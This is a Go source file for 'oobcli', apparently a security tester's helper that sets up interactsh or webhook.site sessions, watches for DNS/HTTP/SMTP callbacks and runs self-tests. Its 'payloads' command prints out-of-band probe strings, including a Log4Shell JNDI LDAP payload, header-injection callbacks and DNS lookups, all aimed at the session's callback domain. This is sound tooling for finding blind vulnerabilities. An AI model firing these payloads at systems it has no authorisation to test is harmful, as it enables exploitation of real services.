package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type SessionMeta struct {
	ID         string            `json:"id"`
	Label      string            `json:"label"`
	Provider   string            `json:"provider"`
	CreatedAt  time.Time         `json:"created_at"`
	Notes      string            `json:"notes,omitempty"`
	ProviderKV map[string]string `json:"provider_kv,omitempty"`
}

func dataDir() (string, error) {
	// XDG default
	if dd := os.Getenv("XDG_DATA_HOME"); dd != "" {
		return filepath.Join(dd, "oobcli"), nil
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(home, ".local", "share", "oobcli"), nil
}

func sessionsDir() (string, error) {
	dd, err := dataDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(dd, "sessions"), nil
}

func ensureDir(p string) error { return os.MkdirAll(p, 0o755) }

func writeJSON(path string, v any) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	return enc.Encode(v)
}

func readJSON(path string, v any) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	dec := json.NewDecoder(f)
	return dec.Decode(v)
}

func randID() string {
	// timestamp + pid for simplicity (no deps). Not cryptographic.
	return fmt.Sprintf("%d-%d", time.Now().Unix(), os.Getpid())
}

func metaPath(sessPath string) string   { return filepath.Join(sessPath, "meta.json") }
func eventsPath(sessPath string) string { return filepath.Join(sessPath, "events.jsonl") }

func cmdInit(args []string) error {
	fs := flag.NewFlagSet("init", flag.ContinueOnError)
	provider := fs.String("provider", "interactsh", "Provider: interactsh|webhook")
	label := fs.String("label", "", "Optional label for the session")
	note := fs.String("note", "", "Optional note")
	// Webhook.site: optionally accept a preexisting token or URL
	webhookURL := fs.String("webhook-url", "", "Existing webhook.site URL (optional)")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *provider == "interactsh" {
		if _, err := exec.LookPath("interactsh-client"); err != nil {
			return errors.New("interactsh-client not found. Install it or run: oobcli up --provider webhook --webhook-url https://webhook.site/<uuid>")
		}
	}

	if *provider != "interactsh" && *provider != "webhook" {
		return fmt.Errorf("unknown provider: %s", *provider)
	}

	// Pre-flight checks
	if *provider == "interactsh" {
		if _, err := exec.LookPath("interactsh-client"); err != nil {
			return errors.New("interactsh-client not found in PATH. Install from ProjectDiscovery and retry")
		}
	}

	id := randID()
	sdirRoot, err := sessionsDir()
	if err != nil {
		return err
	}
	sessPath := filepath.Join(sdirRoot, id)
	if err := ensureDir(sessPath); err != nil {
		return err
	}

	meta := SessionMeta{
		ID:        id,
		Label:     *label,
		Provider:  *provider,
		CreatedAt: time.Now().UTC(),
		Notes:     *note,
	}
	if *provider == "webhook" && *webhookURL != "" {
		meta.ProviderKV = map[string]string{"webhook_url": *webhookURL}
	}
	if err := writeJSON(metaPath(sessPath), &meta); err != nil {
		return err
	}

	fmt.Println("Initialized session:")
	fmt.Printf("  id: %s\n", meta.ID)
	fmt.Printf("  provider: %s\n", meta.Provider)
	if meta.Label != "" {
		fmt.Printf("  label: %s\n", meta.Label)
	}
	if meta.Notes != "" {
		fmt.Printf("  note: %s\n", meta.Notes)
	}
	if meta.Provider == "webhook" {
		if url := meta.ProviderKV["webhook_url"]; url != "" {
			fmt.Printf("  webhook: %s\n", url)
		} else {
			fmt.Println("  webhook: not set (pass --webhook-url or create via site)")
		}
	} else {
		fmt.Println("  interactsh: endpoint printed when watching (assigned by client)")
	}
	fmt.Printf("  path: %s\n", sessPath)
	return nil
}

func cmdList(args []string) error {
	fs := flag.NewFlagSet("list", flag.ContinueOnError)
	if err := fs.Parse(args); err != nil {
		return err
	}
	sdirRoot, err := sessionsDir()
	if err != nil {
		return err
	}
	entries, err := os.ReadDir(sdirRoot)
	if err != nil && !os.IsNotExist(err) {
		return err
	}
	if len(entries) == 0 {
		fmt.Println("No sessions found.")
		return nil
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		meta := SessionMeta{}
		if err := readJSON(filepath.Join(sdirRoot, e.Name(), "meta.json"), &meta); err != nil {
			fmt.Printf("%s (missing meta)\n", e.Name())
			continue
		}
		label := meta.Label
		if label == "" {
			label = "-"
		}
		fmt.Printf("%s  %s  %s\n", meta.ID, meta.Provider, label)
	}
	return nil
}

func openAppend(path string) (*os.File, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return nil, err
	}
	return f, nil
}

func cmdWatch(args []string) error {
	fs := flag.NewFlagSet("watch", flag.ContinueOnError)
	sessionID := fs.String("session", "", "Session id to use")
	provider := fs.String("provider", "", "Override provider (optional)")
	filter := fs.String("filter", "", "Comma-separated filter: http,dns,smtp")
	save := fs.String("out", "", "Output JSONL file (default: session/events.jsonl)")
	clientArgs := fs.String("client-args", "", "Extra args for interactsh-client (quoted)")
	bg := fs.Bool("bg", false, "Run watcher in background and return")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *sessionID == "" {
		return errors.New("--session is required")
	}

	sdirRoot, err := sessionsDir()
	if err != nil {
		return err
	}
	sessPath := filepath.Join(sdirRoot, *sessionID)
	if _, err := os.Stat(metaPath(sessPath)); err != nil {
		return fmt.Errorf("session not found: %s", *sessionID)
	}
	meta := SessionMeta{}
	if err := readJSON(metaPath(sessPath), &meta); err != nil {
		return err
	}
	if *provider != "" {
		meta.Provider = *provider
	}

	var outPath string
	if *save != "" {
		outPath = *save
	} else {
		outPath = eventsPath(sessPath)
	}
	if err := ensureDir(filepath.Dir(outPath)); err != nil {
		return err
	}

	if *bg {
		return startWatchBackground(sessPath, meta, outPath, *filter, *clientArgs)
	}

	outFile, err := openAppend(outPath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	switch meta.Provider {
	case "interactsh":
		return watchInteractsh(sessPath, &meta, outFile, *filter, *clientArgs)
	case "webhook":
		url := ""
		if meta.ProviderKV != nil {
			url = meta.ProviderKV["webhook_url"]
		}
		if url == "" {
			return errors.New("webhook provider requires --webhook-url set during init")
		}
		return watchWebhookSite(url, outFile, *filter)
	default:
		return fmt.Errorf("unknown provider: %s", meta.Provider)
	}
}

func watchInteractsh(sessPath string, meta *SessionMeta, out io.Writer, filter, extra string) error {
	if _, err := exec.LookPath("interactsh-client"); err != nil {
		return errors.New("interactsh-client not found in PATH")
	}
	args := []string{"-json"}
	if extra != "" {
		// naive split by space (avoid deps). Users can pass simple flags.
		parts := strings.Fields(extra)
		args = append(args, parts...)
	}
	cmd := exec.Command("interactsh-client", args...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}
	if err := cmd.Start(); err != nil {
		return err
	}
	defer cmd.Process.Kill()

	fmt.Fprintln(os.Stderr, "interactsh-client started (streaming JSON)…")
	// Parse stderr for assigned URLs/domains and persist once
	go func() {
		scanner := bufio.NewScanner(stderr)
		saved := false
		for scanner.Scan() {
			line := scanner.Text()
			fmt.Fprintln(os.Stderr, line)
			if saved {
				continue
			}
			if urlStr, domain := parseInteractshLine(line); urlStr != "" || domain != "" {
				if meta.ProviderKV == nil {
					meta.ProviderKV = map[string]string{}
				}
				if urlStr != "" {
					meta.ProviderKV["interactsh_url"] = urlStr
				}
				if domain != "" {
					meta.ProviderKV["interactsh_domain"] = domain
				}
				// Persist meta.json
				_ = writeJSON(metaPath(sessPath), meta)
				saved = true
			}
		}
	}()
	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		line := scanner.Bytes()
		// Try to filter by protocol if present
		if filter != "" {
			var m map[string]any
			if err := json.Unmarshal(line, &m); err == nil {
				if p, ok := m["protocol"].(string); ok {
					if !containsCSV(filter, p) {
						continue
					}
				}
			}
		}
		out.Write(line)
		out.Write([]byte("\n"))
		os.Stdout.Write(line)
		os.Stdout.Write([]byte("\n"))
	}
	if err := scanner.Err(); err != nil {
		return err
	}
	return cmd.Wait()
}

var (
	reURL    = regexp.MustCompile(`https?://[a-zA-Z0-9._:-]+`)
	reDomain = regexp.MustCompile(`([a-z0-9-]+\.[a-z0-9.-]*oast[a-z0-9.-]*)`)
)

func parseInteractshLine(s string) (urlStr, domain string) {
	if m := reURL.FindString(s); m != "" {
		urlStr = m
		if u, err := url.Parse(m); err == nil {
			domain = u.Hostname()
		}
	}
	if domain == "" {
		if m := reDomain.FindString(s); m != "" {
			domain = m
		}
	}
	return
}

func watchWebhookSite(inboxURL string, out io.Writer, filter string) error {
	// Minimal polling of webhook.site public API. Assumes inboxURL like https://webhook.site/<uuid>
	// We'll derive the token (uuid) and poll JSON endpoint. Best-effort tolerant parsing.
	if filter != "" && !containsCSV(filter, "http") {
		fmt.Fprintln(os.Stderr, "filter excludes http; no events will match for webhook.site")
	}
	u, err := url.Parse(inboxURL)
	if err != nil {
		return fmt.Errorf("invalid webhook url: %w", err)
	}
	parts := strings.Split(strings.Trim(u.Path, "/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		return errors.New("webhook url must end with inbox UUID, e.g., https://webhook.site/<uuid>")
	}
	token := parts[len(parts)-1]
	apiBase := strings.TrimSuffix(getenvDefault("WEBHOOK_SITE_API_BASE", "https://webhook.site"), "/")
	reqURL := fmt.Sprintf("%s/token/%s/requests?sorting=newest&limit=100", apiBase, token)

	client := &http.Client{Timeout: 15 * time.Second}
	seen := map[string]struct{}{}
	fmt.Fprintf(os.Stderr, "Polling %s …\n", reqURL)
	for {
		req, _ := http.NewRequest("GET", reqURL, nil)
		req.Header.Set("Accept", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Fprintln(os.Stderr, "poll error:", err)
			time.Sleep(5 * time.Second)
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 401 || resp.StatusCode == 403 {
			fmt.Fprintln(os.Stderr, "webhook.site API requires an API key; skipping watch. Use send-test and inspect UI.")
			return nil
		}
		if resp.StatusCode >= 400 {
			fmt.Fprintf(os.Stderr, "webhook.site API status %d: %s\n", resp.StatusCode, strings.TrimSpace(string(b)))
			time.Sleep(5 * time.Second)
			continue
		}
		// Parse as {data: []} or []
		var outer struct {
			Data []json.RawMessage `json:"data"`
		}
		var arr []json.RawMessage
		var parsed bool
		if err := json.Unmarshal(b, &outer); err == nil && len(outer.Data) > 0 {
			arr = outer.Data
			parsed = true
		}
		if !parsed {
			if err := json.Unmarshal(b, &arr); err != nil {
				// Try to parse line-delimited JSON
				s := bufio.NewScanner(bytes.NewReader(b))
				for s.Scan() {
					line := bytes.TrimSpace(s.Bytes())
					if len(line) == 0 {
						continue
					}
					var m map[string]any
					if err := json.Unmarshal(line, &m); err == nil {
						handleWebhookItem(m, seen, out)
					}
				}
				time.Sleep(3 * time.Second)
				continue
			}
		}
		for _, raw := range arr {
			var m map[string]any
			if err := json.Unmarshal(raw, &m); err == nil {
				handleWebhookItem(m, seen, out)
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func handleWebhookItem(m map[string]any, seen map[string]struct{}, out io.Writer) {
	// Try a few possible id keys
	var id string
	tryKeys := []string{"uuid", "id", "request_id"}
	for _, k := range tryKeys {
		if v, ok := m[k]; ok {
			if s, ok := v.(string); ok {
				id = s
				break
			}
			if f, ok := v.(float64); ok {
				id = fmt.Sprintf("%.0f", f)
				break
			}
		}
	}
	if id == "" {
		// Hash-like fallback using method+path+time if available
		id = fmt.Sprintf("%v|%v|%v", m["method"], m["path"], m["time"])
	}
	if _, ok := seen[id]; ok {
		return
	}
	seen[id] = struct{}{}
	// Annotate and emit
	m["provider"] = "webhook"
	m["seen_at"] = time.Now().UTC().Format(time.RFC3339)
	enc := json.NewEncoder(out)
	if err := enc.Encode(m); err == nil {
		// Also print compact line
		line, _ := json.Marshal(m)
		os.Stdout.Write(line)
		os.Stdout.Write([]byte("\n"))
	}
}

func getenvDefault(k, def string) string {
	v := os.Getenv(k)
	if v == "" {
		return def
	}
	return v
}

func cmdSendTest(args []string) error {
	fs := flag.NewFlagSet("send-test", flag.ContinueOnError)
	sessionID := fs.String("session", "", "Session id to use")
	method := fs.String("method", "GET", "HTTP method")
	pathPart := fs.String("path", "/", "Request path, e.g., /probe")
	body := fs.String("body", "", "Request body for POST/PUT/PATCH")
	targetOverride := fs.String("target-url", "", "Override target URL (required for interactsh unless known)")
	waitFor := fs.Duration("wait", 0, "Wait duration to confirm arrival (e.g., 5s, 10s)")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *sessionID == "" {
		return errors.New("--session is required")
	}

	sdirRoot, err := sessionsDir()
	if err != nil {
		return err
	}
	sessPath := filepath.Join(sdirRoot, *sessionID)
	if _, err := os.Stat(metaPath(sessPath)); err != nil {
		return fmt.Errorf("session not found: %s", *sessionID)
	}
	meta := SessionMeta{}
	if err := readJSON(metaPath(sessPath), &meta); err != nil {
		return err
	}

	var base string
	switch meta.Provider {
	case "webhook":
		if meta.ProviderKV != nil {
			base = meta.ProviderKV["webhook_url"]
		}
		if base == "" {
			return errors.New("webhook session missing webhook_url; re-init with --webhook-url")
		}
	case "interactsh":
		base = *targetOverride
		if base == "" {
			if env := os.Getenv("INTERACTSH_URL"); env != "" {
				base = env
			}
		}
		if base == "" && meta.ProviderKV != nil {
			// Use captured URL if available
			if v := meta.ProviderKV["interactsh_url"]; v != "" {
				base = v
			}
		}
		if base == "" {
			return errors.New("interactsh target unknown. Pass --target-url obtained from interactsh-client output or set INTERACTSH_URL env var")
		}
	default:
		return fmt.Errorf("unknown provider: %s", meta.Provider)
	}

	// Normalize path
	p := *pathPart
	if !strings.HasPrefix(p, "/") {
		p = "/" + p
	}
	full := strings.TrimRight(base, "/") + p
	reqBody := io.Reader(nil)
	if *body != "" {
		reqBody = strings.NewReader(*body)
	}
	req, err := http.NewRequest(strings.ToUpper(*method), full, reqBody)
	if err != nil {
		return err
	}
	testID := "test-" + randID()
	req.Header.Set("User-Agent", "oobcli/0.1 (+personal)")
	req.Header.Set("X-OOB-Test", testID)
	if reqBody != nil {
		req.Header.Set("Content-Type", "application/octet-stream")
	}
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	fmt.Printf("sent %s %s  status=%d  test_id=%s\n", req.Method, full, resp.StatusCode, testID)
	// Optional confirmation
	if *waitFor > 0 {
		ok := false
		deadline := time.Now().Add(*waitFor)
		switch meta.Provider {
		case "webhook":
			ok = waitForWebhookTest(meta, testID, deadline)
		case "interactsh":
			// Tail events.jsonl if watch is running for this session
			eventsFile := eventsPath(sessPath)
			ok = waitForLocalEvents(eventsFile, testID, deadline)
		}
		if ok {
			fmt.Println("confirmation: event observed")
		} else {
			fmt.Println("confirmation: not observed within wait window")
		}
	}
	fmt.Println("Tip: run 'watch' to see it arrive, and filter by header X-OOB-Test if supported by provider UI.")
	return nil
}

func startWatchBackground(sessPath string, meta SessionMeta, outPath, filter, clientArgs string) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	// Build args without --bg
	bgArgs := []string{"watch", "--session", meta.ID}
	if meta.Provider != "" {
		bgArgs = append(bgArgs, "--provider", meta.Provider)
	}
	if filter != "" {
		bgArgs = append(bgArgs, "--filter", filter)
	}
	if outPath != "" {
		bgArgs = append(bgArgs, "--out", outPath)
	}
	if clientArgs != "" {
		bgArgs = append(bgArgs, "--client-args", clientArgs)
	}
	cmd := exec.Command(exe, bgArgs...)
	// Redirect stdout/stderr to log
	logFile := filepath.Join(sessPath, "watch.log")
	f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	cmd.Stdout = f
	cmd.Stderr = f
	if err := cmd.Start(); err != nil {
		f.Close()
		return err
	}
	pid := cmd.Process.Pid
	os.WriteFile(filepath.Join(sessPath, "watch.pid"), []byte(fmt.Sprintf("%d\n", pid)), 0o644)
	fmt.Printf("watch started in background: pid=%d  log=%s\n", pid, logFile)
	return nil
}

func cmdUp(args []string) error {
	fs := flag.NewFlagSet("up", flag.ContinueOnError)
	provider := fs.String("provider", "interactsh", "Provider: interactsh|webhook")
	label := fs.String("label", "auto", "Optional label")
	note := fs.String("note", "", "Optional note")
	webhookURL := fs.String("webhook-url", "", "Webhook.site URL (if provider=webhook)")
	filter := fs.String("filter", "http,dns,smtp", "Filters for watch")
	clientArgs := fs.String("client-args", "", "Extra args for interactsh-client")
	wait := fs.Duration("wait", 10*time.Second, "Wait for self-test confirmation")
	if err := fs.Parse(args); err != nil {
		return err
	}

	// 1) init
	initArgs := []string{"--provider", *provider}
	if *label != "" {
		initArgs = append(initArgs, "--label", *label)
	}
	if *note != "" {
		initArgs = append(initArgs, "--note", *note)
	}
	if *provider == "webhook" && *webhookURL != "" {
		initArgs = append(initArgs, "--webhook-url", *webhookURL)
	}
	if err := cmdInit(initArgs); err != nil {
		return err
	}

	// Find latest created session (by listing dir entries and sorting by CreatedAt)
	sdirRoot, _ := sessionsDir()
	entries, _ := os.ReadDir(sdirRoot)
	var newest SessionMeta
	var newestPath string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		p := filepath.Join(sdirRoot, e.Name())
		m := SessionMeta{}
		if err := readJSON(metaPath(p), &m); err == nil {
			if newest.ID == "" || m.CreatedAt.After(newest.CreatedAt) {
				newest = m
				newestPath = p
			}
		}
	}
	if newest.ID == "" {
		return errors.New("failed to locate newly created session")
	}

	// 2) watch in background
	if err := startWatchBackground(newestPath, newest, eventsPath(newestPath), *filter, *clientArgs); err != nil {
		return err
	}

	// 3) If interactsh, wait for assigned URL
	if newest.Provider == "interactsh" {
		fmt.Println("waiting for interactsh URL assignment…")
		deadline := time.Now().Add(15 * time.Second)
		for time.Now().Before(deadline) {
			m := SessionMeta{}
			if err := readJSON(metaPath(newestPath), &m); err == nil {
				if m.ProviderKV != nil && (m.ProviderKV["interactsh_url"] != "" || m.ProviderKV["interactsh_domain"] != "") {
					newest = m
					break
				}
			}
			time.Sleep(500 * time.Millisecond)
		}
	}

	// 4) Print endpoints
	printEndpoints(newest)

	// 5) Self-test
	fmt.Println("sending self-test…")
	stArgs := []string{"--session", newest.ID, "--path", "/oobcli-self-test", "--body", "ok", "--wait", wait.String()}
	if newest.Provider == "interactsh" {
		// Try to use captured URL; if not present, rely on env or user override (send-test will handle)
		if newest.ProviderKV != nil && newest.ProviderKV["interactsh_url"] != "" {
			stArgs = append(stArgs, "--target-url", newest.ProviderKV["interactsh_url"])
		}
	}
	if err := cmdSendTest(stArgs); err != nil {
		fmt.Println("self-test error:", err)
	}

	fmt.Println("ready.")
	return nil
}

func printEndpoints(meta SessionMeta) {
	switch meta.Provider {
	case "interactsh":
		domain := ""
		base := ""
		if meta.ProviderKV != nil {
			base = meta.ProviderKV["interactsh_url"]
			domain = meta.ProviderKV["interactsh_domain"]
		}
		if base == "" && domain != "" {
			base = "https://" + domain
		}
		if base != "" {
			fmt.Println("HTTP:", base)
		}
		if domain != "" {
			fmt.Println("DNS:", domain)
			fmt.Println("SMTP:", domain)
		}
	case "webhook":
		if meta.ProviderKV != nil && meta.ProviderKV["webhook_url"] != "" {
			fmt.Println("HTTP:", meta.ProviderKV["webhook_url"])
		}
	}
}

func cmdEndpoints(args []string) error {
	fs := flag.NewFlagSet("endpoints", flag.ContinueOnError)
	sessionID := fs.String("session", "", "Session id")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *sessionID == "" {
		return errors.New("--session is required")
	}
	sdirRoot, _ := sessionsDir()
	p := filepath.Join(sdirRoot, *sessionID)
	m := SessionMeta{}
	if err := readJSON(metaPath(p), &m); err != nil {
		return err
	}
	printEndpoints(m)
	return nil
}

func cmdStop(args []string) error {
	fs := flag.NewFlagSet("stop", flag.ContinueOnError)
	sessionID := fs.String("session", "", "Session id")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *sessionID == "" {
		return errors.New("--session is required")
	}
	sdirRoot, _ := sessionsDir()
	p := filepath.Join(sdirRoot, *sessionID)
	pidData, err := os.ReadFile(filepath.Join(p, "watch.pid"))
	if err != nil {
		return fmt.Errorf("no watch.pid found for session %s", *sessionID)
	}
	pidStr := strings.TrimSpace(string(pidData))
	fmt.Println("stopping watcher pid", pidStr)
	// Try to kill process
	// Cross-platform minimal: on Unix, use kill; on Windows this is no-op unless taskkill
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 1 {
		return fmt.Errorf("invalid pid in watch.pid: %q", pidStr)
	}
	if proc, err := os.FindProcess(pid); err == nil {
		_ = proc.Kill()
	}
	// Remove pid file
	_ = os.Remove(filepath.Join(p, "watch.pid"))
	return nil
}

func cmdPayloads(args []string) error {
	fs := flag.NewFlagSet("payloads", flag.ContinueOnError)
	sessionID := fs.String("session", "", "Session id")
	id := fs.String("id", "", "Correlation id to embed (auto if empty)")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *sessionID == "" {
		return errors.New("--session is required")
	}
	if *id == "" {
		*id = "p-" + randID()
	}
	sdirRoot, _ := sessionsDir()
	p := filepath.Join(sdirRoot, *sessionID)
	m := SessionMeta{}
	if err := readJSON(metaPath(p), &m); err != nil {
		return err
	}
	switch m.Provider {
	case "interactsh":
		domain := ""
		base := ""
		if m.ProviderKV != nil {
			base = m.ProviderKV["interactsh_url"]
			domain = m.ProviderKV["interactsh_domain"]
		}
		if base == "" && domain != "" {
			base = "https://" + domain
		}
		if domain == "" && base != "" {
			if u, err := url.Parse(base); err == nil {
				domain = u.Hostname()
			}
		}
		if base == "" && domain == "" {
			return errors.New("interactsh URL/domain unknown — run 'watch' or 'up' first")
		}
		fmt.Println("# HTTP")
		fmt.Printf("curl -sS %s/%s\\?x=%s\\&t=$(date +%%s)\n", strings.TrimRight(base, "/"), *id, *id)
		fmt.Println("# Header injection")
		fmt.Printf("curl -sS -H 'X-Callback: https://%s/%s' https://example.com/\n", domain, *id)
		fmt.Println("# DNS")
		fmt.Printf("nslookup %s.%s\n", *id, domain)
		fmt.Println("# Log4Shell")
		fmt.Printf("${jndi:ldap://%s/%s}\n", domain, *id)
	case "webhook":
		base := ""
		if m.ProviderKV != nil {
			base = m.ProviderKV["webhook_url"]
		}
		if base == "" {
			return errors.New("webhook URL unknown — re-init with --webhook-url")
		}
		fmt.Println("# HTTP")
		fmt.Printf("curl -sS '%s/%s?x=%s'\n", strings.TrimRight(base, "/"), *id, *id)
		fmt.Println("# Header injection")
		fmt.Printf("curl -sS -H 'X-Callback: %s/%s' https://example.com/\n", strings.TrimRight(base, "/"), *id)
	default:
		return fmt.Errorf("unknown provider: %s", m.Provider)
	}
	return nil
}

// waitForWebhookTest polls the webhook.site API for a request containing the X-OOB-Test header with testID until deadline.
func waitForWebhookTest(meta SessionMeta, testID string, deadline time.Time) bool {
	urlStr := ""
	if meta.ProviderKV != nil {
		urlStr = meta.ProviderKV["webhook_url"]
	}
	if urlStr == "" {
		return false
	}
	u, err := url.Parse(urlStr)
	if err != nil {
		return false
	}
	parts := strings.Split(strings.Trim(u.Path, "/"), "/")
	if len(parts) == 0 {
		return false
	}
	token := parts[len(parts)-1]
	apiBase := strings.TrimSuffix(getenvDefault("WEBHOOK_SITE_API_BASE", "https://webhook.site"), "/")
	reqURL := fmt.Sprintf("%s/token/%s/requests?sorting=newest&limit=50", apiBase, token)
	client := &http.Client{Timeout: 10 * time.Second}
	for time.Now().Before(deadline) {
		req, _ := http.NewRequest("GET", reqURL, nil)
		req.Header.Set("Accept", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 401 || resp.StatusCode == 403 {
			fmt.Fprintln(os.Stderr, "webhook.site API requires an API key; skipping confirmation.")
			return false
		}
		// Try parse as {data: []} or []
		var outer struct {
			Data []map[string]any `json:"data"`
		}
		var arr []map[string]any
		parsed := false
		if err := json.Unmarshal(b, &outer); err == nil && len(outer.Data) > 0 {
			arr = outer.Data
			parsed = true
		}
		if !parsed {
			_ = json.Unmarshal(b, &arr)
		}
		for _, m := range arr {
			if webhookHasTestID(m, testID) {
				return true
			}
		}
		time.Sleep(2 * time.Second)
	}
	return false
}

func webhookHasTestID(m map[string]any, testID string) bool {
    // Try headers as map[string]any
    if hs, ok := m["headers"].(map[string]any); ok {
        for k, v := range hs {
            if strings.EqualFold(k, "X-OOB-Test") {
                // value could be string or array (webhook.site often uses arrays)
                if s, ok := v.(string); ok && strings.Contains(s, testID) {
                    return true
                }
                if arr, ok := v.([]any); ok {
                    for _, it := range arr {
                        if strings.Contains(strings.ToLower(fmt.Sprint(it)), strings.ToLower(testID)) {
                            return true
                        }
                    }
                }
            }
        }
    }
	// Try headers as []map
	if hs, ok := m["headers"].([]any); ok {
		for _, it := range hs {
			if kv, ok := it.(map[string]any); ok {
				name := fmt.Sprint(kv["name"]) // common schema
				val := fmt.Sprint(kv["value"])
				if strings.EqualFold(name, "X-OOB-Test") && strings.Contains(val, testID) {
					return true
				}
			}
		}
	}
	// Fallback: search raw content
	for _, k := range []string{"raw", "raw_body", "content", "text"} {
		if s, ok := m[k].(string); ok && strings.Contains(s, testID) {
			return true
		}
	}
	return false
}

// waitForLocalEvents tails the given events.jsonl for the testID until deadline
func waitForLocalEvents(eventsFile, testID string, deadline time.Time) bool {
	// Start from current size
	f, err := os.Open(eventsFile)
	if err != nil {
		return false
	}
	defer f.Close()
	off, _ := f.Seek(0, io.SeekEnd)
	for time.Now().Before(deadline) {
		// Reopen and seek to last offset
		f2, err := os.Open(eventsFile)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		f2.Seek(off, io.SeekStart)
		sc := bufio.NewScanner(f2)
		for sc.Scan() {
			b := sc.Bytes()
			off += int64(len(b)) + 1
			if bytes.Contains(b, []byte(testID)) {
				f2.Close()
				return true
			}
		}
		f2.Close()
		time.Sleep(1 * time.Second)
	}
	return false
}

func containsCSV(csv, needle string) bool {
	for _, p := range strings.Split(csv, ",") {
		if strings.TrimSpace(strings.ToLower(p)) == strings.ToLower(needle) {
			return true
		}
	}
	return false
}

func usage() {
	fmt.Println("oobcli — Interactsh/Webhook.site helper")
	fmt.Println()
	fmt.Println("Usage:")
	fmt.Println("  oobcli init --provider=interactsh|webhook [--label NAME] [--webhook-url URL]")
	fmt.Println("  oobcli list")
	fmt.Println("  oobcli watch --session ID [--filter http,dns,smtp] [--client-args '...'] [--bg]")
	fmt.Println("  oobcli endpoints --session ID")
	fmt.Println("  oobcli send-test --session ID [--method POST] [--path /x] [--body 'payload'] [--target-url URL] [--wait 10s]")
	fmt.Println("  oobcli up [--provider interactsh|webhook] [--webhook-url URL] [--client-args '...'] [--wait 10s]")
	fmt.Println("  oobcli stop --session ID")
	fmt.Println("  oobcli payloads --session ID [--id CORR]")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  oobcli init --provider=interactsh --label recon")
	fmt.Println("  oobcli list")
	fmt.Println("  oobcli watch --session 1700000000-12345 --filter http --client-args '-http' ")
	fmt.Println("  oobcli send-test --session 1700000000-12345 --method POST --path /probe --body 'hi' --target-url https://<sub>.oast.live --wait 10s")
	fmt.Println("  oobcli up --provider interactsh --client-args '-http' --wait 10s")
}

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}
	cmd := os.Args[1]
	args := os.Args[2:]
	var err error
	switch cmd {
	case "init":
		err = cmdInit(args)
	case "list":
		err = cmdList(args)
	case "watch":
		err = cmdWatch(args)
	case "endpoints":
		err = cmdEndpoints(args)
	case "send-test":
		err = cmdSendTest(args)
	case "up":
		err = cmdUp(args)
	case "stop":
		err = cmdStop(args)
	case "payloads":
		err = cmdPayloads(args)
	case "help", "-h", "--help":
		usage()
		return
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n\n", cmd)
		usage()
		os.Exit(1)
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
}
